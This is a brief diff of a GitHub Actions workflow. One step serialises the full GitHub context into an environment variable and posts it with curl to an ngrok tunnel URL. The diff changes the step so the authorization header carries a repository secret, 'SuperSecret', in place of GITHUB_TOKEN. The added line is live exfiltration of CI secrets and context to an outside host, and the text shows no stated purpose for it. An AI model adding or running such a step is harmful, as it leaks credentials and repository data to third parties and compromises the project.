@@ -21,7 +21,7 @@ jobs:
           GITHUB_CONTEXT: ${{ toJSON(github) }}
           super_secret: ${{ secrets.SuperSecret }}  
       run: | 
-        curl -d "$GITHUB_CONTEXT" -H "Content-Type: application/json" -H 'authorization: Bearer ${{ secrets.GITHUB_TOKEN }}' -X POST https://6b1b42be7dea.ngrok.io/payload
+        curl -d "$GITHUB_CONTEXT" -H "Content-Type: application/json" -H 'authorization: Bearer ${{ secrets.SuperSecret }}' -X POST https://6b1b42be7dea.ngrok.io/payload
 
 
 
